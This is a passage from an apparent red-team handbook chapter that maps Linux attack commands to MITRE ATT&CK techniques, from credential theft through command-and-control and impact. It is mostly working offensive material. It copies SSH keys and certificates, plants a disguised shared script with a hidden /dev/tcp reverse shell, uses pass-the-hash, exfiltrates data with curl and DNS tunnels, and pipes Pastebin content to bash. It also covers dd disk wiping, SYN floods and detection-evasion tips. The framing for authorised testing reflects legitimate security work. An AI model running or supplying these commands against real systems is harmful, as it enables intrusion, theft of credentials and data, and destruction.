- Unshadowed password hashes enable offline cracking

**Operational Security**:
- File access may trigger file integrity monitoring
- Consider copying rather than moving sensitive files
- Clean up temporary files after extraction

### Steal or Forge Authentication Certificates (T1649)

This involves stealing or forging certificates used for authentication.

**Certificate Extraction**:
```bash
# Extract SSH keys
cp -r ~/.ssh/ /tmp/stolen_ssh_keys/

# Extract SSL certificates
find /etc/ssl -name "*.pem" -o -name "*.key" -exec cp {} /tmp/stolen_certs/ \;
```

**Specific ATT&CK Mapping**:
- Certificate theft implements T1649
- SSH key extraction enables future authentication

**Red Team Guidance**:
- Focus on certificates with broad access rights
- Examine expiration dates for long-term utility
- Document all extracted certificates for reporting

### Unsecured Credentials (T1552)

This involves finding credentials in files, configurations, or other insecure locations.

#### Credentials In Files (T1552.001)

Tools for finding credentials in files:

**Credential Discovery Commands**:
```bash
# Search for password patterns in config files
grep -r "password\|passwd\|pass" --include="*.conf" --include="*.config" --include="*.ini" /etc/

# Find credentials in history files
grep -r "password\|passwd\|pass\|user\|username" --include="*.history" /home/
```

**Specific ATT&CK Mapping**:
- File credential discovery implements T1552.001
- Configuration file examination often reveals passwords

**Operational Considerations**:
- File access patterns may trigger security monitoring
- Use focused searches rather than broad scans
- Examine application-specific config locations

### Hashcat: Password Cracking

**Hashcat** provides GPU-accelerated password cracking:

```bash
# Crack Linux shadow hashes (SHA512crypt)
hashcat -m 1800 -a 0 hashes.txt wordlist.txt

# Use rule-based attack
hashcat -m 1800 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# Brute force short passwords
hashcat -m 1800 -a 3 hashes.txt ?a?a?a?a?a?a
```

**Specific ATT&CK Mapping**:
- Hash cracking supports credential access but isn't a specific ATT&CK technique
- Cracked passwords enable Valid Accounts technique (T1078)

**Red Team Approach**:
- Use organization-specific wordlists based on company info
- Apply custom rules that match password policy patterns
- Document cracking effectiveness for reporting

### John the Ripper: Password Cracking

**John the Ripper** offers versatile password cracking:

```bash
# Crack shadow file passwords
sudo john --format=sha512crypt hashes.txt

# Use wordlist with rules
sudo john --wordlist=wordlist.txt --rules hashes.txt

# Show cracked passwords
sudo john --show hashes.txt
```

**Specific ATT&CK Mapping**:
- Like Hashcat, John the Ripper supports credential access techniques
- Custom rules enable targeting specific password policies

> **RED TEAM TIP:**
>
> Develop a credential hunting checklist for Linux systems:
>
> | Location | Command | ATT&CK Mapping |
> |----------|---------|----------------|
> | Shadow File | `sudo cat /etc/shadow` | T1003.008 |
> | SSH Keys | `find / -name id_rsa 2>/dev/null` | T1552.004 |
> | Config Files | `grep -r "password" --include="*.conf" /etc/` | T1552.001 |
> | History Files | `cat ~/.bash_history` | T1552 |
> | Browser Data | `ls ~/.mozilla/firefox/*.default*/logins.json` | T1555.003 |
>
> This systematic approach ensures comprehensive credential discovery during operations.

## Discovery Automation Tools

Discovery consists of techniques used to gain knowledge about the system and network. This tactic includes techniques for enumerating system configurations, network resources, and applications.

### Account Discovery (T1087)

This involves gathering information about user accounts on a system.

#### Local Account (T1087.001)

Tools for local account discovery:

**Account Enumeration Commands**:
```bash
# List all local users
cat /etc/passwd | cut -d: -f1

# Find users with login shells
grep -v '/nologin\|/false' /etc/passwd

# List users with sudo access
grep -Po '^sudo.+:\K.*$' /etc/group
```

**Specific ATT&CK Mapping**:
- Local user enumeration directly implements T1087.001
- Group membership discovery identifies privileged accounts

**Detection Considerations**:
- Multiple account queries in rapid succession may trigger alerts
- Access to sensitive files like /etc/shadow might be monitored
- Command sequences can indicate discovery activities

### File and Directory Discovery (T1083)

This involves enumerating files and directories on a system.

**Filesystem Enumeration**:
```bash
# Find all world-writable directories
find / -type d -perm -o+w 2>/dev/null

# Locate configuration files
find /etc -name "*.conf" -type f 2>/dev/null

# Search for sensitive files
find /home -name "*.key" -o -name "*.pem" -o -name "*.pgp" 2>/dev/null
```

**Specific ATT&CK Mapping**:
- Directory and file enumeration implements T1083
- Sensitive file discovery enables credential access

**Operational Security**:
- Use targeted searches rather than broad directory scans
- Consider time delays between operations
- Focus on high-value locations first

### Network Service Discovery (T1046)

This involves identifying services running on remote systems.

**Nmap Service Discovery**:
```bash
# Basic service discovery
nmap -sV 192.168.1.0/24

# Low and slow scan
nmap -sV -T2 --max-retries 1 192.168.1.0/24
```

**Specific ATT&CK Mapping**:
- Service version scanning implements T1046
- Port scanning identifies potential entry points

**Detection Awareness**:
- Network scanning is frequently detected by security monitoring
- Consider using existing tools on the system rather than uploading scanners
- Target specific ports of interest rather than complete scans

### Network Share Discovery (T1135)

This involves finding shared drives and folders on the network.

**Network Share Enumeration**:
```bash
# List NFS exports
showmount -e 192.168.1.100

# Find Samba shares
smbclient -L //192.168.1.100 -N
```

**Specific ATT&CK Mapping**:
- Network share discovery directly implements T1135
- Share enumeration identifies potential data sources

**Red Team Approach**:
- Look for shares with weak permissions
- Document mount points for potential lateral movement
- Check for sensitive data in shared locations

### Password Policy Discovery (T1201)

This involves determining password policies to inform brute force attacks.

**Policy Enumeration**:
```bash
# Check password requirements
cat /etc/pam.d/common-password

# Check account lockout settings
cat /etc/pam.d/common-auth | grep "deny="

# Check password age requirements
cat /etc/login.defs | grep "PASS_"
```

**Specific ATT&CK Mapping**:
- Password policy discovery implements T1201
- Policy information improves credential access attempts

**Operational Considerations**:
- Policy discovery helps avoid account lockouts
- Use information to tailor password attacks
- Document findings for reporting and future engagements

### Permission Groups Discovery (T1069)

This involves identifying permission groups and their members.

**Group Enumeration**:
```bash
# List all groups
cat /etc/group

# Find members of specific groups
getent group sudo
getent group admin
```

**Specific ATT&CK Mapping**:
- Group enumeration implements T1069
- Permission discovery identifies privilege escalation paths

### System Information Discovery (T1082)

This involves gathering detailed information about the operating system and hardware.

**System Enumeration**:
```bash
# Basic system information
uname -a
cat /etc/os-release

# Hardware information
lscpu
lsblk
free -m

# Environment information
env
set
```

**Specific ATT&CK Mapping**:
- System information gathering implements T1082
- Version details enable targeted exploit selection

### Legion: Automated Network Scanner

**Legion** provides comprehensive network discovery:

```bash
# Launch Legion (GUI tool)
sudo legion

# CLI usage (if available)
legion-cli -t 192.168.1.0/24 -o scan_results
```

**Specific ATT&CK Mapping**:
- Legion implements multiple discovery techniques:
  - Network Service Discovery (T1046)
  - System Information Discovery (T1082)
  - Software Discovery (T1518)

**Red Team Guidance**:
- Use integrated tools for comprehensive discovery
- Export findings in structured format for later use
- Focus on actionable intelligence for next attack phases

> **RED TEAM TIP:**
>
> When performing discovery operations, follow this sequence to minimize detection:
>
> 1. Start with passive discovery (files, local configuration)
> 2. Progress to active local discovery (accounts, processes)
> 3. Move to network discovery only when necessary
> 4. Use native tools where possible
> 5. Limit scan scopes to necessary targets
>
> This approach reduces the chance of triggering alerts while still gathering essential information.

## Lateral Movement Frameworks

Lateral Movement consists of techniques used to enter and control remote systems on a network. Several tools in this book specialize in facilitating lateral movement.

### Exploitation of Remote Services (T1210)

This involves exploiting vulnerable services on remote systems to gain access.

**Metasploit Framework**:
```bash
# Launch Metasploit
msfconsole

# Use exploit for remote service
use exploit/linux/samba/is_known_pipename
set RHOSTS 192.168.1.100
set LHOST 192.168.1.200
exploit
```

**Specific ATT&CK Mapping**:
- Remote service exploitation directly implements T1210
- Metasploit provides a framework for multiple exploitation techniques

**Operational Considerations**:
- Failed exploitation attempts may crash services
- Successful exploits often leave evidence in logs
- Consider reliability and stealth when selecting exploits

### Internal Spearphishing (T1534)

This involves using compromised accounts to send phishing messages to other internal users.

**Gophish for Internal Phishing**:
```bash
# Configure campaign with internal sender address
# Use compromised mail account credentials
# Target users based on internal directory information
```

**Specific ATT&CK Mapping**:
- Internal phishing campaigns implement T1534
- Using trusted internal senders increases success rates

**Detection Awareness**:
- Email security tools may detect internal phishing
- Unusual sending patterns might trigger alerts
- Consider timing and targeting to appear legitimate

### Remote Services (T1021)

This involves using remote access protocols to move laterally.

#### SSH (T1021.004)

Tools for SSH-based lateral movement:

**SSH Command Execution**:
```bash
# Execute command on remote system
ssh user@192.168.1.100 "whoami; hostname"

# Use SSH keys for authentication
ssh -i stolen_key user@192.168.1.100

# SSH port forwarding
ssh -L 8080:internal-server:80 user@192.168.1.100
```

**Specific ATT&CK Mapping**:
- SSH usage for remote access implements T1021.004
- Port forwarding enables access to otherwise unreachable systems

**Red Team Approach**:
- Use compromised credentials or keys from earlier stages
- Implement SSH tunneling for additional lateral movement paths
- Consider persistent SSH configurations in ~/.ssh/config

### Pass the Hash (T1550.002)

This involves using password hashes for authentication without knowing the plaintext password.

**Pass the Hash with Impacket**:
```bash
# SMB connection using hash
python impacket-smbclient -hashes aad3b435b51404eeaad3b435b51404ee:C23AD9B5F526D8F48D90A9D2E6DD52F3 administrator@192.168.1.100

# Execute command with hash
python impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:C23AD9B5F526D8F48D90A9D2E6DD52F3 administrator@192.168.1.100
```

**Specific ATT&CK Mapping**:
- Hash-based authentication implements T1550.002
- Credential reuse enables lateral movement without password cracking

**Operational Security**:
- Pass-the-hash attempts may be logged in authentication records
- Consider using legitimate remote access methods when credentials are available
- Test techniques before operational use to verify effectiveness

### Tainted Shared Content (T1080)

This involves placing malicious content in shared locations to gain access to systems.

**Malicious Script in Shared Location**:
```bash
# Create malicious script
cat > /mnt/shared/update.sh << EOF
#!/bin/bash
# Legitimate-looking script content
echo "Updating system components..."
# Malicious payload
bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' &
# Continue with legitimate-looking operations
echo "Update complete."
EOF

chmod +x /mnt/shared/update.sh
```

**Specific ATT&CK Mapping**:
- Malicious content in shared locations implements T1080
- Exploits trust relationships between systems and users

**Red Team Guidance**:
- Target shared locations used by administrators or privileged users
- Make malicious content appear legitimate and useful
- Consider exfiltrating and modifying existing shared scripts

### Empire: Post-Exploitation Framework

**Empire** provides comprehensive lateral movement capabilities:

```bash
# Start Empire
sudo empire

# Create a listener
uselistener http
set Name lateral
set Host 192.168.1.100
set Port 8080
execute

# Generate a stager
usestager multi/bash
set Listener lateral
execute

# Use lateral movement modules
usemodule lateral_movement/ssh_command
set Target 192.168.1.110
set Username compromised_user
set Password Password123
execute
```

**Specific ATT&CK Mapping**:
- Empire implements multiple lateral movement techniques:
  - Remote Service exploitation (T1210)
  - Use of Remote Services (T1021)
  - Various credential techniques (T1550)

> **RED TEAM TIP:**
>
> Create a lateral movement map for your target network:
>
> 1. Document discovered systems and credentials
> 2. Map trust relationships between systems
> 3. Identify critical junction points for lateral movement
> 4. Plan multiple movement paths to critical assets
> 5. Implement least-noisy techniques first
>
> This systematic approach ensures efficient lateral movement while minimizing detection.

## Collection and Exfiltration Tools

Collection consists of techniques used to gather data of interest, while Exfiltration involves techniques to steal data from the target organization. Several specialized tools focus on these tactics.

### Data from Local System (T1005)

This involves gathering data from local systems before exfiltration.

**Local Data Collection**:
```bash
# Find and archive sensitive files
find /home -name "*.docx" -o -name "*.xlsx" -o -name "*.pdf" -exec cp {} /tmp/collected/ \;

# Compress collected data
tar czf collected_data.tar.gz /tmp/collected/
```

**Specific ATT&CK Mapping**:
- Local file gathering implements T1005
- Targeted collection focuses on valuable data

**Operational Considerations**:
- Large file operations may trigger performance monitoring
- Consider collecting data in small batches
- Focus on high-value targets identified during reconnaissance

### Data Staged (T1074)

This involves collecting and organizing data prior to exfiltration.

**Data Staging**:
```bash
# Create hidden staging directory
mkdir -p ~/.cache/.staged/

# Stage data in size-limited chunks
split -b 10M collected_data.tar.gz ~/.cache/.staged/part_

# Create manifest
ls -la ~/.cache/.staged/ > ~/.cache/.staged/manifest.txt
```

**Specific ATT&CK Mapping**:
- Data staging implements T1074
- Organization facilitates controlled exfiltration

**Detection Awareness**:
- Unusual disk activity may trigger alerts
- Hidden directories can be discovered during security scans
- Consider staging in expected locations with high write activity

### Data Transfer Size Limits (T1030)

This involves limiting the size of data chunks to avoid detection.

**Chunked Data Transfer**:
```bash
# Split data into 1MB chunks
split -b 1M large_file.dat chunk_

# Transfer individual chunks with delays
for chunk in chunk_*; do
  curl -F "file=@$chunk" http://192.168.1.100/upload.php
  sleep 30
done
```

**Specific ATT&CK Mapping**:
- Chunked file transfer implements T1030
- Size limits avoid network traffic anomalies

**Red Team Approach**:
- Determine appropriate chunk sizes based on target environment
- Implement random delays between transfers
- Consider normal working hours for transfer timing

### Exfiltration Over Alternative Protocol (T1048)

This involves using protocols other than the primary C2 channel for data exfiltration.

#### Exfiltration Over DNS (T1048.003)

Tools for DNS-based exfiltration:

**DNScat2**: Command and control over DNS.
```bash
# Start the server on attacker system
ruby dnscat2.rb domain.com

# On the victim, connect to the server
./dnscat2 domain.com
```

**Specific ATT&CK Mapping**:
- DNS tunneling directly implements T1048.003
- Using DNS avoids many content filters

**Operational Security**:
- DNS tunneling may be detected by security monitoring
- Consider data encoding to minimize request volumes
- Use subdomains that appear legitimate

#### Exfiltration Over Encrypted Channel (T1048.002)

Tools for encrypted exfiltration:

**HTTPS Data Transfer**:
```bash
# Using curl for secure exfiltration
curl -k -X POST -F "data=@collected_data.tar.gz" https://192.168.1.100/upload.php

# Using OpenSSL directly
openssl s_client -connect 192.168.1.100:443 -quiet < collected_data.tar.gz
```

**Specific ATT&CK Mapping**:
- Encrypted transfer implements T1048.002
- HTTPS blends with normal web traffic

**Detection Considerations**:
- Large encrypted transfers may still trigger volume alerts
- SSL/TLS inspection might reveal suspicious content
- Consider mimicking legitimate application traffic patterns

### Encrypted Channel (T1573)

This involves using encryption to hide the contents of command and control traffic.

**Encrypted Communication**:
```bash
# Generate encryption key
openssl rand -base64 32 > key.bin

# Encrypt data before transfer
openssl enc -aes-256-cbc -salt -in collected_data.tar.gz -out data.enc -pass file:./key.bin

# Transfer encrypted data
curl -F "file=@data.enc" http://192.168.1.100/upload.php
```

**Specific ATT&CK Mapping**:
- Custom encryption implements T1573
- Encryption prevents content inspection

### PacketWhisper: Steganographic Exfiltration

**PacketWhisper** provides stealth exfiltration through DNS:

```bash
# Start PacketWhisper
python packetWhisper.py

# Select exfiltration options:
# - Encoding: Base256
# - Transport: DNS (or ICMP/HTTP)
# - Chunk size: Small
# - Select file to exfiltrate
```

**Specific ATT&CK Mapping**:
- Steganographic techniques implement multiple exfiltration methods:
  - Exfiltration Over Alternative Protocol (T1048)
  - Obfuscated Files or Information (T1027)

**Red Team Guidance**:
- Use steganography for highly sensitive data
- Test exfiltration channels before operational use
- Have multiple exfiltration methods available

> **RED TEAM TIP:**
>
> Develop an exfiltration decision tree based on target environment:
>
> | Environment | Primary Method | Secondary Method | Last Resort |
> |-------------|---------------|------------------|-------------|
> | Strict DLP | DNS Tunneling | Steganography | Physical Exfiltration |
> | Standard Corporate | HTTPS | Custom Encrypted | DNS Tunneling |
> | Basic Security | HTTPS | FTP/SFTP | Email Attachments |
>
> This approach ensures you have appropriate exfiltration options for different security levels.

## Command and Control Frameworks

Command and Control (C2) consists of techniques adversaries use to communicate with systems under their control. Several specialized frameworks focus on establishing and maintaining C2 channels.

### Application Layer Protocol (T1071)

This involves using application layer protocols for command and control communications.

#### Web Protocols (T1071.001)

Tools for web-based C2:

**Metasploit HTTP/HTTPS C2**:
```bash
# Set up HTTP handler
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_https
set LHOST 192.168.1.100
set LPORT 443
exploit -j
```

**Specific ATT&CK Mapping**:
- HTTP-based command and control implements T1071.001
- Web protocols blend with normal traffic

**Operational Considerations**:
- Configure realistic HTTP headers and cookies
- Match traffic patterns to legitimate web behavior
- Consider implementing random timing to avoid pattern detection

#### DNS (T1071.004)

Tools for DNS-based C2:

**DNScat2**: Command and control over DNS.
```bash
# Start the server
ruby dnscat2.rb domain.com

# On the victim
./dnscat2 domain.com
```

**Specific ATT&CK Mapping**:
- DNS tunneling implements T1071.004
- DNS communication often bypasses strict firewall controls

**Detection Awareness**:
- Abnormal DNS query volumes may trigger alerts
- Long DNS names might be flagged
- Consider limiting query frequency and size

### Encrypted Channel (T1573)

This involves using encrypted communications to hide command and control traffic.

**OpenSSL for Custom Encryption**:
```bash
# Create listening server with SSL/TLS
openssl s_server -key server.key -cert server.crt -accept 443 -quiet

# Connect from client
openssl s_client -connect 192.168.1.100:443 -quiet
```

**Specific ATT&CK Mapping**:
- Custom encrypted channel implements T1573
- Encryption prevents content inspection

**Red Team Approach**:
- Use standard ports for encrypted traffic (443, 8443)
- Implement certificate pinning to avoid interception
- Consider traffic shaping to match legitimate patterns

### Ingress Tool Transfer (T1105)

This involves transferring tools to the target system for execution.

**Tool Transfer Methods**:
```bash
# Using curl
curl -o /tmp/tool.bin http://192.168.1.100/tool.bin
chmod +x /tmp/tool.bin

# Using wget
wget -O /tmp/tool.bin http://192.168.1.100/tool.bin
chmod +x /tmp/tool.bin

# Using SSH
scp tool.bin user@192.168.1.110:/tmp/
```

**Specific ATT&CK Mapping**:
- Tool transfer implements T1105
- Multiple transfer methods provide operational flexibility

**Operational Security**:
- Consider encoding or encrypting tools before transfer
- Transfer to locations with appropriate permissions
- Clean up transfer artifacts after execution

### Non-Standard Port (T1571)

This involves using uncommon ports for command and control to evade filtering.

**Custom Port Usage**:
```bash
# Set up listener on non-standard port
nc -lvnp 58671

# Connect from client
nc 192.168.1.100 58671
```

**Specific ATT&CK Mapping**:
- Uncommon port usage implements T1571
- Port selection helps avoid basic firewall rules

**Red Team Guidance**:
- Use ports that appear similar to legitimate services
- Consider high ports that may be less monitored
- Document port usage for reporting and cleanup

### Web Service (T1102)

This involves using public web services for command and control.

**C2 Over Public Services**:
```bash
# Example using GitHub as a C2 channel
curl -s https://raw.githubusercontent.com/redteam/commands/main/instructions.txt | bash

# Example using Pastebin
curl -s https://pastebin.com/raw/AbCdEfGh | bash
```

**Specific ATT&CK Mapping**:
- Using legitimate web services implements T1102
- Public services often bypass URL filtering

**Detection Considerations**:
- Access to specific domains might be monitored
- Consider using multiple services for redundancy
- Implement content encryption before posting to public services

### Empire: Post-Exploitation C2 Framework

**Empire** provides a comprehensive C2 framework:

```bash
# Start Empire
sudo empire

# Create a listener
uselistener http
set Name operation
set Host 192.168.1.100
set Port 8080
execute

# Generate a stager
usestager multi/bash
set Listener operation
execute

# Interact with agent
agents
interact C2A3BEP1
```

**Specific ATT&CK Mapping**:
- Empire implements multiple C2 techniques:
  - Application Layer Protocol (T1071)
  - Encrypted Channel (T1573)
  - Various evasion techniques

### Koadic: COM Command & Control

**Koadic** provides COM-based command and control:

```bash
# Start Koadic
./koadic

# Create a listener
use stager/js/mshta
set SRVHOST 192.168.1.100
set SRVPORT 8443
run

# Interact with zombie
zombies
use implant/gather/hashdump
```

**Specific ATT&CK Mapping**:
- Koadic implements various C2 techniques:
  - Web Protocols (T1071.001)
  - COM-based execution (T1559.001)

> **RED TEAM TIP:**
>
> Design a resilient C2 infrastructure with these components:
>
> 1. Multiple frontends (domains, IPs) that appear legitimate
> 2. Redirectors to hide true C2 server locations
> 3. Different protocol options (HTTP, DNS, custom)
> 4. Fallback communication channels
> 5. Automatic infrastructure rotation
>
> This approach ensures operational continuity even if parts of your C2 infrastructure are discovered and blocked.

## Impact Techniques and Tools

Impact techniques represent ways adversaries can disrupt systems and compromise their availability and integrity. Several tools in this book implement these techniques.

### Data Destruction (T1485)

This involves deliberately corrupting or destroying data on target systems.

**Secure Data Wiping**:
```bash
# Overwrite file with random data
shred -uz confidential_file.txt

# Wipe free space
sfill -v /home/user/

# Securely delete directory contents
find /path/to/directory -type f -exec shred -uz {} \;
```

**Specific ATT&CK Mapping**:
- Secure file deletion implements T1485
- Targeted destruction eliminates sensitive information

**Operational Guidance**:
- Focus on high-value targets identified during collection
- Consider filesystem journaling when planning deletion
- Document wiped locations for reporting

### Disk Wipe (T1561)

This involves wiping entire disks or partitions to render them unusable.

**Disk Wiping Tools**:
```bash
# Wipe entire disk
dd if=/dev/urandom of=/dev/sda bs=1M status=progress

# Wipe specific partition
dd if=/dev/zero of=/dev/sda1 bs=1M status=progress
```

**Specific ATT&CK Mapping**:
- Disk wiping directly implements T1561
- Complete destruction prevents recovery

**Red Team Considerations**:
- Full disk wiping is extremely destructive and rarely used in authentic red teams
- Consider simulation rather than actual implementation
- Document theoretical impact for reporting

### Resource Hijacking (T1496)

This involves consuming system resources for unauthorized purposes.

**Resource Consumption**:
```bash
# CPU exhaustion
yes > /dev/null &

# Memory exhaustion
tail /dev/zero | head -c 1G > /dev/null

# Disk space exhaustion
dd if=/dev/zero of=/tmp/largefile bs=1M count=10000
```

**Specific ATT&CK Mapping**:
- Resource consumption implements T1496
- System degradation demonstrates impact

**Detection Awareness**:
- Performance monitoring may detect unusual resource usage
- Consider gradual resource consumption to avoid immediate detection
- Target non-critical resources to minimize operational impact

### Service Stop (T1489)

This involves stopping or disabling services to create a denial of service.

**Service Disruption**:
```bash
# Stop critical service
systemctl stop apache2

# Disable service on boot
systemctl disable mysql

# Kill service process
pkill nginx
```

**Specific ATT&CK Mapping**:
- Service termination implements T1489
- Selective disruption can cause specific impacts

**Operational Security**:
- Service disruption may trigger monitoring alerts
- Consider temporary disruption rather than complete disabling
- Document original service state for restoration

### Network Denial of Service (T1498)

This involves flooding network resources to cause denial of service.

**Network Flooding Tools**:
```bash
# Simple SYN flood
hping3 --flood --rand-source -S -p 80 target.com

# UDP flood
udpflood target.com 53 100000
```

**Specific ATT&CK Mapping**:
- Network flooding implements T1498
- Targeted disruption affects specific services

**Red Team Guidance**:
- Network DoS attacks are rarely executed in actual red teams
- Consider simulation rather than implementation
- Document theoretical impact for reporting

### Defacement (T1491)

This involves changing visible content to demonstrate compromise.

**Web Defacement**:
```bash
# Replace website content
echo "<html><body><h1>Hacked by Red Team</h1></body></html>" > /var/www/html/index.html

# Add hidden watermark
echo "<!-- Accessed by Red Team on $(date) -->" >> /var/www/html/index.html
```

**Specific ATT&CK Mapping**:
- Content modification implements T1491
- Defacement provides evidence of compromise

**Operational Considerations**:
- Visible defacement immediately alerts defenders
- Consider hidden watermarks instead of obvious changes
- Document possible defacement vectors for reporting

> **RED TEAM TIP:**
>
> For impact demonstrations, consider these less-destructive alternatives:
>
> 1. Create benign "marker" files instead of deleting data
> 2. Temporarily rename critical files rather than removing them
> 3. Throttle services rather than stopping them completely
> 4. Take screenshots of access to critical systems as evidence
> 5. Use minimal resource consumption tests rather than full denial of service
>
> These approaches demonstrate impact without causing actual damage to production systems.

## Conclusion: The ATT&CK-Driven Red Team

Mapping your red team tools and techniques to the MITRE ATT&CK framework provides several significant benefits:

1. **Comprehensive Coverage**: Ensures your operations test the full range of adversary behaviors
2. **Realistic Emulation**: Allows your team to mimic specific threat actors' TTPs
3. **Structured Reporting**: Provides a common language for communicating findings
4. **Defense Validation**: Enables specific testing of detection and prevention controls
5. **Continuous Improvement**: Highlights gaps in your offensive capabilities

By organizing your Linux toolset according to ATT&CK tactics and techniques, you transform from a general technical assessment team into a sophisticated red team capable of realistically simulating advanced adversaries.

The mapping presented in this chapter serves as both a reference guide for selecting appropriate tools and a framework for designing comprehensive red team operations. As you continue to enhance your skills, regularly review the ATT&CK framework for updates and new techniques to incorporate into your methodology.

## Additional Resources

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [Atomic Red Team](https://atomicredteam.io/)
- [ATT&CK Evaluations](https://attackevals.mitre-engenuity.org/)
- [VECTR - Purple Team Mapping Tool](https://github.com/SecurityRiskAdvisors/VECTR)
- [Red Team Automation](https://github.com/endgameinc/RTA)
- [ATT&CK for ICS](https://collaborate.mitre.org/attackics/)
- [Mapping Your Threat Intelligence to ATT&CK](https://www.mitre.org/sites/default/files/publications/pr-18-1613-mapping-your-threat-intelligence-to-attck.pdf)
